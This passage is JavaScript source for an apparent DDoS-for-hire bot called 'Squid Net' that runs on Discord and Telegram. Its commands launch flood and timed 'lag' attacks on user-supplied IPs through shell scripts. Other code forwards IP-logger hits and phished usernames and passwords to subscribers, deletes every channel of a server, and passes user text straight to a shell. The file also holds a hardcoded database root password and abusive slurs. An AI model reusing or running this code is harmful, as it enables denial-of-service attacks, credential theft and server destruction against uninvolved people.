          sql = `INSERT INTO history (user, date, command, ends) VALUES (${user}, ${messageTime}, "${response}", "${parseInt(messageTime) + parseInt(rtime)}")`;
          con.query(sql)
          var cmdToLaunch = `screen -d -m ./runattack.sh spongebob apiattack ${ip} ${dport} ${time} ${method}`;

          function execCB(error, stdout, stderr) {}
          var app = exec(cmdToLaunch, execCB);
          var cmdToLaunch = `screen -d -m ./runattack.sh kraken stdhex ${ip} ${dport} ${time} ${http} ${l6} ${l7}`;

          function execCB(error, stdout, stderr) {}
          var app = exec(cmdToLaunch, execCB);
          var cmdToLaunch = `screen -d -m ./runattack.sh godzilla vsehex ${ip} ${dport} ${time} ${http} ${l6} ${l7}`;

          function execCB(error, stdout, stderr) {}
          var app = exec(cmdToLaunch, execCB);
          var string = `Method: **ANNIHILATE**\nHost: **${ip}**\nPort: **${port}**\nLength: **${time}**`
          var embed = new Discord.MessageEmbed()
            .setTitle("Attack Sent to:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          var conexpire1 = Number(time) * 1000;
          var conexpire = Number(conexpire1) + Number(messageTime);
          sql = `UPDATE user SET spongeCooldown ="${conexpire}" WHERE id ="${user}"`;
          con.query(sql)
        } else if (method.includes("ASCEND")) {
          sql = `INSERT INTO history (user, date, command, ends) VALUES (${user}, ${messageTime}, "${response}", "${parseInt(messageTime) + parseInt(rtime)}")`;
          con.query(sql)
          var cmdToLaunch = `screen -d -m ./runattack.sh kraken stdhex ${ip} ${port} ${dport} ${http} ${l6} ${l7}`;

          function execCB(error, stdout, stderr) {}
          var app = exec(cmdToLaunch, execCB);
          var cmdToLaunch = `screen -d -m ./runattack.sh godzilla vsehex ${ip} ${port} ${dport} ${http} ${l6} ${l7}`;

          function execCB(error, stdout, stderr) {}
          var app = exec(cmdToLaunch, execCB);
          var string = `Method: **ASCEND**\nHost: **${ip}**\nPort: **${port}**\nLength: **${dport}**`
          var embed = new Discord.MessageEmbed()
            .setTitle("Attack Sent to:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          var conexpire1 = Number(time) * 1000;
          var conexpire = Number(conexpire1) + Number(messageTime);
          sql = `UPDATE user SET godzillaCooldown ="${conexpire}" WHERE id ="${user}"`;
          con.query(sql)
        } else if (server == "backup1"){
          sql = `INSERT INTO history (user, date, command, ends) VALUES (${user}, ${messageTime}, "${response}", "${parseInt(messageTime) + parseInt(rtime)}")`;
          con.query(sql)
          var cmdToLaunch = `screen -d -m ./runattack.sh ${server} ${method} ${ip} ${port} ${time}`;

          function execCB(error, stdout, stderr) {}
          var app = exec(cmdToLaunch, execCB);
            var string = `Method: **${method1}**\nHost: **${ip}**\nPort: **${port}**\nLength: **${time}**`
            var embed = new Discord.MessageEmbed()
              .setTitle("Attack Sent to:")
              .setAuthor("Squid Net")
              .setColor(0x089FEF)
              .setDescription(`${string}`)
              .setTimestamp()
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
          } else {
            sql = `INSERT INTO history (user, date, command, ends) VALUES (${user}, ${messageTime}, "${response}", "${parseInt(messageTime) + parseInt(rtime)}")`;
            con.query(sql)
            var cmdToLaunch = `screen -d -m ./runattack.sh ${server} ${method} ${ip} ${time} ${dport} ${http} ${l6} ${l7}`;

            function execCB(error, stdout, stderr) {}
            var app = exec(cmdToLaunch, execCB);
              var string = `Method: **${method1}**\nHost: **${ip}**\nPort: **${port}**\nLength: **${time}**`
              var embed = new Discord.MessageEmbed()
                .setTitle("Attack Sent to:")
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `${string}`);
              }
            }
        var output = execSync(`echo "[${fancyDate}] ATTACK ACCEPTED" >> users/${user}cmd.log`, {
          encoding: 'utf-8'
        });
        break;
      }
      case 'lag': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Discord") {
          if (!ddosenabledservers.includes(`${guildID}`)) {
            return;
          }
        }
        var response = args.join(' ');

        function countWords(str) {
          str = str.replace(/(^\s*)|(\s*$)/gi, "");
          str = str.replace(/[ ]{2,}/gi, " ");
          str = str.replace(/\n /, "\n");
          return str.split(' ').length;
        }
        var length = countWords(response);
        var minLength = 2
        if (length < minLength) {
          var string = `-------------------------------------------\n/lag {method} {ip} {length between attacks} {attack length} {number of times to send attack} {port} <- Optional\n-------------------------------------------`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (fs.existsSync(`/root/bot/users/${user}.pid`)) {
          var string = "You already have one running"
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (parseInt(row.globalCooldown) > parseInt(messageTime)) {
          var h = 00
          var m = 00
          var s = 00
          var d = 00
          var h = Math.floor(parseFloat(`${parseInt(row.globalCooldown) - parseInt(messageTime)}`) / 1000 / 60 / 60);
          var m = Math.floor((parseFloat(`${parseInt(row.globalCooldown) - parseInt(messageTime)}`) / 1000 / 60 / 60 - h) * 60);
          var s = Math.floor(((parseFloat(`${parseInt(row.globalCooldown) - parseInt(messageTime)}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
          if (h < 24) {
            var d = 0
          } else {
            var d = parseInt(h / 24)
            var h = h % 24;
          }
          var string = `**Your access has been put on a timeout for breaking one of our rules.**\nFor more information or to open an appeal open a ticket.\n\nYou can use this again in: **Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}`
          var embed = new Discord.MessageEmbed()
            .setTitle("")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        var method = "err";
        var ip = "err";
        var time = "err";
        var dport = " ";
        var http = " ";
        var lba1 = " ";
        var atkcount = " ";
        var [method, ip, lba1, time, atkcount, dport] = args.toString().toLowerCase().split(",");
        var lba = parseInt(lba1) + parseInt(time);
        if (dport == null) {
          var dport = "dport=80"
          var port = "80"
        } else {
          if (dport.includes("dport")) {
            var port = dport.slice(6);
          }
          if (!dport.includes("dport=")) {
            var port = dport;
            var dport = `dport=${port}`
          }
        }
        if (time == null) {
          var time = "1"
        } else {}
        var execSync = require('child_process').execSync;
        var output = execSync(`curl http://ip-api.com/json/${ip}`, {
          encoding: 'utf-8'
        });
        if (output.includes(".gov")) {
          var string = `No gov`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (output.includes("fbi")) {
          var string = `No fbi`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (!methods.includes(`${method}`)) {
          var string = `${method} isnt a method do **/methods**`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (time.includes(`.`)) {
          var string = `You fucking idoit length cant have a **.**`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (!ip.includes(`.`)) {
          var string = `You fucking idoit thats not an ip`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (method.includes("squid")) {
          var method1 = "squid"
          var method = "stdhex"
        } else {
          var method1 = method
        }

        /*
        function findCommonElement(ip, refuse) {
          var block = fs.readFileSync(`allow.txt`, 'utf-8');
          var refuse = block.split(',');
          for (let i = 0; i < refuse.length; i++) {
            for (let j = 0; j < args.length; j++) {
              if (refuse[i] === args[j]) {
                illegal = "true";
                return true;
              }
            }
          }
          illegal = "false";
          return false;
        } // Check for illegal arguments.
        findCommonElement()
        if (illegal === "true") {} else {
          var output = execSync(`./checkip.sh ${ip} > checkip.txt`, {
            encoding: 'utf-8'
          });
          var filter = execSync(`tr , '\n' < checkip.txt`, {
            encoding: 'utf-8'
          });
          var a = filter.replace("country", "Country");
          var b = a.replace("country_code", "Country Code");
          var c = b.replace("continent", "Continent");
          var d = c.replace("continent_Code", "Continent Code");
          var e = d.replace("city", "City");
          var f = e.replace("county", "County");
          var g = f.replace("region", "Region");
          var h = g.replace("region_code", "Region Code");
          var i = h.replace("timezone", "Timezone");
          var j = i.replace("owner", "Owner");
          var k = j.replace("longitude", "Longitude");
          var l = k.replace("latitude", "Latitude");
          var m = l.replace("currency", "Currency");
          var n = m.replace("languages", "Languages");
          var o = n.replace(/\"/g, "");
          var p = o.replace(/\{/g, "");
          var q = p.replace(/\}/g, "");
          var r = q.replace(/\[/g, "")
          var s = r.replace(/\]/g, "")
          var t = s.replace(":", " -> ");
          var u = t.replace(":", " -> ");
          counter = 1
          while (counter < 10) {
            var t = u.replace(":", " -> ");
            var u = t.replace(":", " -> ");
            counter++;
          }
          if (u.includes("abuseConfidenceScore -> 0")) {
            var output = execSync(`sed -i '$ s/$/,'` + ip + `'/' allow.txt`, {
              encoding: 'utf-8'
            });
          } else {
            message.reply("dont hit")
            var output = execSync(`sed -i '$ s/$/,'` + ip + `'/' block.txt`, {
              encoding: 'utf-8'
            });
            break;
          }
        }*/
        if (Number(time) > maxLagLimit) {
          var string = `Your time limit is ${maxLagLimit}`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (Number(atkcount) > maxAtkCount) {
          var string = `Your attack count limit is ${maxAtkCount}`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        var exec = require('child_process').exec;
        var cmdToLaunch = `screen -d -m -S ${user} ./lag1.sh ${user} ${method} ${ip} ${time} ${lba} ${atkcount} ${dport}`;

        function execCB(error, stdout, stderr) {}

        var app = exec(cmdToLaunch, execCB);
        var string = `Method: **${method1}**\nHost: **${ip}**\nPort: **${port}**\nTime Btwn Att: **${lba}**\nLength: **${time}**\nAtt Count: **${atkcount}**`
        var embed = new Discord.MessageEmbed()
          .setTitle("Lag switch Started:")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'lagstop': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Discord") {
          if (!ddosenabledservers.includes(`${guildID}`)) {
            return;
          }
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        if (fs.existsSync(`/root/bot/users/${user}.pid`)) {
          const output = execSync(`cat /root/bot/users/${user}.pid`, {
            encoding: 'utf-8'
          }); // the default is 'buffer'
          const output1 = execSync(`kill ${output}`, {
            encoding: 'utf-8'
          }); // the default is 'buffer'
          const output2 = execSync(`rm -rf /root/bot/users/${user}.pid`, {
            encoding: 'utf-8'
          }); // the default is 'buffer'
          var string = `Stopped lag with a proccess id of ${output}`
          var embed = new Discord.MessageEmbed()
            .setTitle("Lag stopped!")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        } else {
          var string = "You dont have a lag running!"
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
      }
      case 'skid': {
        var string = "Yea, Everyone knows you are."
        if (runningBot == "Discord") {
          message.channel.send(`${string}`)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'kick': {
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `This is a discord only command!`);
          return;
        }
        if (!powerOverride.includes(`${user}`)) {
          if (!message.member.hasPermission("KICK_MEMBERS")) {
            return message.channel.send(`**${message.author.username}**, Fuck off cunt`)
          }
        }
        let target = message.mentions.members.first();

        if (!target) {
          return message.channel.send(`**${message.author.username}**, You cant kick the fucking void`)
        }
        target.kick(args[1]);
        message.channel.send(`Kicked this fool`)
        break;
      }
      case 'ban': {
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `This is a discord only command!`);
          return;
        }
        if (!powerOverride.includes(`${user}`)) {
          if (!message.member.hasPermission("KICK_MEMBERS")) {
            return message.channel.send(`**${message.author.username}**, Fuck off cunt`)
          }
        }
        let target = message.mentions.members.first();

        if (!target) {
          return message.channel.send(`**${message.author.username}**, You cant ban the fucking void`)
        }
        target.ban(args[1]);
        message.channel.send(`Banned this fool`)
        break;
      }
      case 'roach': {
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `This is a discord only command!`);
          return;
        }
        var aa1 = message.guild.roles.cache.find(r => r.name === "ROACH");
        if (!powerOverride.includes(`${user}`)) {
          if (!message.member.hasPermission("KICK_MEMBERS")) {
            return message.channel.send(`**${message.author.username}**, Fuck off cunt`)
          }
        }
        let target = message.mentions.members.first();

        if (!target) {
          return message.channel.send(`who?`)
        }
        var mem = message.mentions.members.first();
        mem.roles.add(aa1)
        message.channel.send(`Fucking roaches`)
        break;
      }
      case 'unroach': {
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `This is a discord only command!`);
          return;
        }
        var aa1 = message.guild.roles.cache.find(r => r.name === "ROACH");
        if (!powerOverride.includes(`${user}`)) {
          if (!message.member.hasPermission("KICK_MEMBERS")) {
            return message.channel.send(`**${message.author.username}**, Fuck off cunt`)
          }
        }
        let target = message.mentions.members.first();

        if (!target) {
          return message.channel.send(`who?`)
        }
        var mem = message.mentions.members.first();
        mem.roles.remove(aa1)
        message.channel.send(`uhhh nothing happened here.`)
        break;
      }
      case 'nuke': {
        if (illegal === true) {
          break;
        }
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `This is a discord only command!`);
          return;
        }
        if (!powerOverride.includes(`${user}`)) {
          message.channel.send("Nope.")
          break;
        }
        var channel = message.channel;
        channel.clone()
        channel.delete()
        message.channel.send("Channel Nuked :skull:")
        break;
      }
      case 'hiroshima': {
        if (illegal === true) {
          break;
        }
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `This is a discord only command!`);
          return;
        }
        con.end();
        var response = args.join(' ');
        if (!powerOverride.includes(`${user}`)) {
          message.channel.send("Nope.")
          break;
        }
        message.guild.channels.cache.forEach(channel => channel.delete())
        guild.setName(`${response}`)
        guild.setIcon('./icon.png')
        guild.channels.create(`${response}`, {
          type: 'text',
          topic: `${response}`,
          message: `${response}`,
        }).then(channel => channel.send(`@everyone ${response}`))
        break;
      }
      case 'clear': {
        if (illegal === true) {
          break;
        }
        var response = args.join(' ');
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `This is a discord only command!`);
          return;
        }
        if (message.member.hasPermission("MANAGE_MESSAGES")) {
          if (args > 100) {
            var args = 100
          }
          message.channel.bulkDelete(parseInt(args)).then(msg => {
            msg.delete({ timeout: 10000 })
          })
          message.channel.send(`Removed ${args} Messages`)
          break;
        } else {
          message.channel.send("NO PERMS RETARD");
          break;
        }
        break;
      }
      case 'profile': {
        if (illegal === true) {
          break;
        }
        var response = args.join(' ');
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `This is a discord only command!`);
          return;
        }
        message.channel.send(message.author.avatarURL())
        break;
      }
      case 'bortclear': {
        if (illegal === true) {
          break;
        }
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `This is a discord only command!`);
          return;
        }
        if (message.member.hasPermission("MANAGE_MESSAGES")) {
          message.channel.bulkDelete(1);
          message.channel.messages.fetch().then(messages => {
            var botMessages = messages.filter(msg => msg.content.startsWith("/"));
            message.channel.bulkDelete(botMessages);
          }).catch(err => {
            console.log('Error while doing Bulk Delete');
            console.log(err);
          });
          message.channel.messages.fetch().then(messages => {
            var botMessages = messages.filter(msg => msg.author.id == client.user.id);
            message.channel.bulkDelete(botMessages);
            message.channel.send("You saw nothing.").then(msg => {
              msg.delete({ timeout: 1000 })
            })
            .catch(console.error);
          }).catch(err => {
            console.log('Error while doing Bulk Delete');
            console.log(err);
          });
          break;
        } else {
          message.channel.send("NO PERMS RETARD");
          break;
        }
        break;
      }
      case 'userclear': {
        if (illegal === true) {
          break;
        }
        var response = args.join(' ');
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `This is a discord only command!`);
          return;
        }
        if (message.member.hasPermission("MANAGE_MESSAGES")) {
          message.channel.bulkDelete(1);
          message.channel.messages.fetch().then(messages => {
            var botMessages = messages.filter(msg => msg.author.id == response);
            message.channel.bulkDelete(botMessages);
          }).catch(err => {
            console.log('Error while doing Bulk Delete');
            console.log(err);
          });
          break;
        } else {
          message.channel.send("NO PERMS RETARD");
          break;
        }
        break;
      }
      case 'info': {
        if (illegal === true) {
          break;
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        const output = execSync(`cat info.txt`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var string = `${output}`
        var embed = new Discord.MessageEmbed()
          .setTitle("Bort Information:")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
          .setFooter(``);
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'run': {
        if (fs.existsSync(`terminal/${user}.txt`)) {
          var response = args.join(' ');
          var execSync = require('child_process').execSync;
          var exec = require('child_process').exec
          var output = `screen -S ${user} -p 0 -X stuff '${response}^M'`;

          function execCB(error, stdout, stderr) {}
          var app = exec(output, execCB);
          var contents = "err";
          sleep(500)
            .then(() => {
              var output = execSync(`\\cp -rf terminal/${user}log.txt terminal/${user}out.txt; ./terminal/clean.sh terminal/${user}out.txt terminal/${user}out.txt1; mv terminal/${user}out.txt1 terminal/${user}out.txt`, {
                encoding: 'utf-8'
              });
              var contents = fs.readFileSync(`terminal/${user}out.txt`, 'utf-8');
              var contents = contents.slice(contents.length - 1990)
              fs.writeFile(`terminal/${user}log.txt`, `${contents}`, function(err) {
                if (err) return console.log(err);
              });
              var string = `\`\`\`${contents}\`\`\``
              if (runningBot == "Discord") {
                message.channel.send(`${string}`)
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `${string}`);
              }
            });
        }
        break;
      }
      default:
        commandNotFound();
        break;
      }

    });
  });
}
bot.on('message', (msg) => {
  var messageTime = Date.now(); //Get time for auto expiry
  var runningBot = "Telegram"
  var args = msg.text.slice(prefix.length).trim().split(/ +/g);
  var command1 = args.shift().toLowerCase()
  var command = command1.replace("@realbortbot", "")
  test(command, runningBot, msg, msg.from.id, msg.chat.id);
});
bot.on("polling_error", (err) => console.log(err));
client.on("message", (message) => {
  var user = message.author.id;
  var messageTime = Date.now(); //Get time for auto expiry
  var runningBot = "Discord"
  if (message.content.includes("\\")) {
    return;
  }

  if (parseInt(message.channel.id) == 764757851884486676) {
    var args = message.content.toLowerCase().split(/ +/g);
    var [server, ip, userpass] = args.toString().split(",");
    var con = mysql.createConnection({
      host: "localhost",
      user: "root",
      password: "fuckingpeopleover",
      timeout: 6000000,
      database: "bot"
    });
    con.query(`SELECT * FROM iplogger`, (err, rows) => {
      if (err) throw err;
      rows.forEach((row) => {
        if (parseInt(row.openDM) > messageTime){
          if (parseInt(row.server) == 1) {
            if (parseInt(row.expiry) < messageTime) {
              var string = `Your plan has now expired and will no longer receive logs.`
              var embed = new Discord.MessageEmbed()
                .setTitle(`Logger:`)
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              client.users.cache.get(`${row.id}`).send(embed);
              sql = `delete from iplogger where id="${row.id}"`;
              con.query(sql)
            }
            function sendip() {
              var string = `New log on ${server}: ${ip}`
              var embed = new Discord.MessageEmbed()
                .setTitle(`New Log:`)
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              console.log(row.id)
              console.log(server)
              client.users.cache.get(`${row.id}`).send(embed);
            }
            if (server == "nordvpn" || server == "octosniff" || server == "cyberhub" || server == "nfoservers" || server == "instagram" || server == "vps1" || server == "vps2" || server == "stressthem" || server == "nitro" || server == "psnresolver" || server == "xresolver"|| row.private.toString() == server.toString()) {
                  console.log(`${row.listenFor}:${server}`)
                  var string = `New log on ${server}: ${ip}`
                  var embed = new Discord.MessageEmbed()
                    .setTitle(`New Log:`)
                    .setAuthor("Squid Net")
                    .setColor(0x089FEF)
                    .setDescription(`${string}`)
                    .setTimestamp()
                  if (row.listenFor == server) {
                    client.users.cache.get(`${row.id}`).send(embed);
                    console.log("Listening to one")
                    return;
                  }/*else {
                    client.users.cache.get(`${row.id}`).send(embed);
                    console.log("Listening to all")
                  }*/
                  console.log(!row.listenFor == server)
              }
            }
          }
          if (parseInt(row.phish) == 1) {
            if (server.includes("phished")) {
                var string = `New credentials on ${ip} ${userpass}`
                var embed = new Discord.MessageEmbed()
                  .setTitle(`New Log:`)
                  .setAuthor("Squid Net")
                  .setColor(0x089FEF)
                  .setDescription(`${string}`)
                  .setTimestamp()
                client.users.cache.get(`${row.id}`).send(embed);
            }
          }
      });
    });
  } else {
    if (message.author.bot) return;
  }
  function attachIsExe(msgAttach) {
      var url = msgAttach.url;
      return url.indexOf("exe", url.length - "exe".length /*or 3*/) !== -1;
  }
  if (message.attachments.size > 0) {
    if (message.attachments.every(attachIsExe)){
        var execSync = require('child_process').execSync
        var output = execSync(`bash scan.sh ${attachIsExe.url}`, {
          encoding: 'utf-8'
        });
        console.log(output)
        if (output.includes(`Your resource is queued for analysis`)) {
          message.channel.send("New file found.\nManual scan reccomended.")
          return;
        }
        if (!output.includes(`: 0`)) {
          message.channel.send("This file appears to be malicous")
          return;
        }
        if (output.includes(`: 0`)) {
          message.channel.send("This file appears to be safe")
          return;
        }
    }
  }

  if (message.content.toLowerCase().includes("<@693853122728296538>")) {
    message.channel.send("What bitch?")
    return;
  }
  if (message.content.toLowerCase().includes("<@!693853122728296538>")) {
    message.channel.send("What bitch?")
    return;
  }
  let {
    guild
  } = message;
  if (!guild) {
    var guildname = "Private Message"
  } else {
    var guildname = guild.name;
    var guildID = message.guild.id;
  }
  var args = message.content.toLowerCase().split(/ +/g);
  if (guild) {
    if (parseInt(message.channel.id) == 760345346231631872 || parseInt(message.channel.id) == 760345509205770290 || parseInt(message.channel.id) == 760346432443252736 || parseInt(message.channel.id) == 758772447301337088 || parseInt(message.channel.id) == 758772447784337469 || parseInt(message.channel.id) == 746126448690987019 || parseInt(message.channel.id) == 754657651916275732 || parseInt(message.channel.id) == 747908223331467338) {
      for (let i = 0; i < args.length; i++) {
        if (args[i].match(/\b(?:(?:2(?:[0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9])\.){3}(?:(?:2([0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9]))\b/ig)) {
          console.log('IP Posted in blacklisted Channel: ' + args[i]);
          message.channel.bulkDelete(parseInt(1));
          message.channel.send("Take this command to an authorized channel or dms")
          return;
        }
      }
    }
  }
  var con = mysql.createConnection({
    host: "localhost",
    user: "root",
    password: "fuckingpeopleover",
    timeout: 6000000,
    database: "bot"
  });
  con.query(`SELECT * FROM user WHERE id = ${user}`, (err, rows) => {
    if (err) throw err;
    let sql;
    if (rows.length < 1) {
      var execSync = require('child_process').execSync;
      con.query(`INSERT INTO user (id, plan) VALUES (${user}, ${basePlan})`)
    }
  });
  if (message.channel.name == undefined) {
    var tag = message.author.tag;
    var good = tag.replace(/[^a-z0-9 ,.?!$#]/ig, '')
    sql = `UPDATE user SET user="${good}" WHERE id=${user}`;
    var dm = true
    con.query(sql)
  } else {
    var dm = false
    var tag = message.author.tag;
    var good = tag.replace(/[^a-z0-9 ,.?!$#]/ig, '')
    sql = `UPDATE user SET user="${good}" WHERE id=${user}`;
    con.query(sql)
  }
  if (parseInt(message.channel.id) == 764757851884486676) {

  } else {
    if (message.author.bot) return;
  }
  if (message.content.indexOf(prefix) !== 0) return;
  /*if (message.guild === null) {} else {
    var guildID = message.guild.id;
    if (servers.includes(guildID)) {} else {
      message.channel.send(`I see you.`)
      guild.setName(`TR4P$QU1D SEES YOU`)
      guild.setIcon('./icon.png')
      message.guild.channels.cache.forEach(channel => channel.delete())
      guild.channels.create(`TR4PSQU1D SEES YOU`, {
        type: 'text',
        topic: `TR4P$QU1D SEES YOU`,
        message: `TR4P$QU1D SEES YOU`,
      }).then(channel => channel.send(`@everyone\nSo you added bort to your server, but theres one small problem.\nYou are not authorised so action has been taken. Enjoy your day!`))
      return;
    }
  }*/
  var args = message.content.slice(prefix.length).trim().split(/ +/g);
  var expiry = null;
  var tag = message.author.tag;
  if (runningBot == "Discord") {
    var args = message.content.toLowerCase().split(/ +/g);
  } else if (runningBot == "Telegram") {
    var args = msg.text.slice(prefix.length).trim().split(/ +/g);
  }
  var response = args.join(' ');
  var execSync = require('child_process').execSync
  var fancyDate = new Date(new Date().toUTCString());
  var output = execSync(`echo "[${fancyDate}] ${message.content}" >> users/${user}cmd.log`, {
    encoding: 'utf-8'
  });
  var con = mysql.createConnection({
    host: "localhost",
    user: "root",
    password: "fuckingpeopleover",
    timeout: 6000000,
    database: "bot"
  }); // MYSQL Connection
  var command = args.shift().toLowerCase().slice(prefix.length)
  if (message.guild) {
    var guildID = message.guild.id
  } else {
    var guildID = "dm"
  }
  test(command, runningBot, message, message.author.id, guildID);
});
client.on('message', message => {
  var user = message.author.id;
  var tag = message.author.tag;
  var fancyDate = new Date(new Date().toUTCString());
  //var fancyDate = fancyDate1.slice(0, -31)
  if (parseInt(message.channel.id) == 764757851884486676) {

  } else {
    if (message.author.bot) return;
  }
  if (message.content.indexOf(prefix) !== 0) return;
  let {
    guild
  } = message;
  if (!guild) {
    var guildname = "Private Message"
  } else {
    var guildname = guild.name;
  }
  var embed = new Discord.MessageEmbed()
    .setTitle(`(${tag}) ${user}`)
    .setAuthor("Squid Net")
    .setColor(0x089FEF)
    .setDescription(`Server: ${guildname}\nMessage: **${message.content}**`)
    .setTimestamp()
    .setFooter(``);
  client.channels.cache.get('772960467634094131').send(embed)
  console.log(`DISCORD: [${guildname}] (${tag}) ${user} >> ${message.content}`);
});
bot.on('message', (msg) => {
  var user = msg.from.id;
  var content = msg.text.replace("@realbortbot", "")
  //var content = content1.text.replace("@realbortbot", "")
  console.log(`TELEGRAM: [${msg.chat.type}] (${msg.chat.username}) ${tuser} >> ${content}`);
});
client.login(config.token)
